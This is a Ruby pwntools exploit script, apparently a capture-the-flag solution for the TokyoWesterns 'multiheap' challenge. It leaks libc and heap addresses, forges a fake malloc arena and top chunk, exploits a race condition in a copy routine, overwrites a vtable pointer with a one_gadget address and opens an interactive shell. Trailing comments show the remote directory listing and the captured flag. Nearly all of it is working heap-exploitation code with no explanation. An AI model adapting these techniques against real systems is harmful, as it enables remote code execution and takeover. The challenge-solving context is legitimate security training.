#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = 'multiheap.chal.ctf.westerns.tokyo', 10001
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt; z.gets 'choice: '; end

def alloc(type, size, mt)
  pt
  z.puts 1
  z.puts type
  z.puts size
  z.puts mt
end

def del(idx)
  pt
  z.puts 2
  z.puts idx
end

def write(idx)
  pt
  z.puts 3
  z.puts idx
end

def read(idx, sz, ary)
  pt
  z.puts 4
  z.puts idx
  z.puts sz
  ary << 0 while ary.size < sz
  ary.each { |v| z.puts v }
end

def copy(src_idx, dst_idx, sz)
  pt
  z.puts 5
  z.puts src_idx
  z.puts dst_idx
  z.puts sz
  z.puts 'y'
end

# leak
alloc('char', 0x500, 'm')
alloc('char', 0x500, 'm')
alloc('char', 0x10, 'm')
del(0); del(0)
alloc('long', 0x500, 'm')
write(1)
z.gets 'Index: '
libc = z.gets.to_i - 0x3ebca0
heap = z.gets.to_i - 0x123f0
del(0); del(0)
log.dump libc.hex
log.dump heap.hex
alloc('char', 0x800, 't')
alloc('char', 0x80, 't')
del(0)
alloc('long', 0x800, 't')
write(1)
z.gets 'Index: '
arena_at = z.gets.to_i - 0x80
z.gets '====='
log.dump arena_at.hex

alloc('long', 0x1f0000, 't')
del(2)

alloc('long', 0x20, 'm')
magic = libc + 0x4f322
read(2, 4, [magic, magic, magic, 0x33]) # to overwrite next chunk
hack_at = heap + 0x11fe0

num = 3
33.times { num += 1; alloc('long', 0x1f0000, 't') }

alloc('long', 0x2001000, 'm'); dst_idx = num; num += 1
alloc('long', 0x2001000, 'm'); data_idx = num; num += 1
alloc('long', 0x2001000 - 0x1000, 'm'); src_idx = num; num += 1

payload = [0x10, 0x2001ff3] + [0] * 508 + [
  arena_at + 0x20, 0,
  0x3ff2000, 0x3ff2000,
  0x0000000200000000, 0
] + [0, hack_at] + [0] * 8 + [
  # top = arena_at - 0x4003ff0, 0
  top = arena_at + 0x310, 0
] + 40.times.map { |i| [arena_at + 0x80 + i * 0x10] * 2 }.flatten +
  [0, 0xcf5] + # fake top_chunk
  [0] * 177 +
  [0x3ff2000, 0x3ff2000]

fail if payload.size - 510 != 279
read(data_idx, payload.size, payload)

copy(src_idx, dst_idx, 0)
# race condition, don't wait stdout
sleep(0.2)
z.puts 1
z.puts 'char'
z.puts 0x28
z.puts 't'
idx = num; num += 1
# read
z.puts 4
z.puts idx
z.puts 0x17
vtable = hack_at - 0x10
z.write flat(0, 0x31, vtable)[0, 0x17]

# free
z.puts 2
z.puts 3 # idx

z.interact
# total 52
# drwxr-x--- 2 root multiheap  4096 Aug 31 12:25 .
# drwxr-xr-x 5 root root       4096 Aug 31 12:25 ..
# -rw-r----- 1 root multiheap   220 Apr  4  2018 .bash_logout
# -rw-r----- 1 root multiheap  3771 Apr  4  2018 .bashrc
# -rw-r----- 1 root multiheap   807 Apr  4  2018 .profile
# -rw-r----- 1 root multiheap    26 Aug 31 12:25 flag
# -rwxr-x--- 1 root multiheap 26768 Aug 31 12:25 multi_heap
# TWCTF{mulmulmulmultititi}
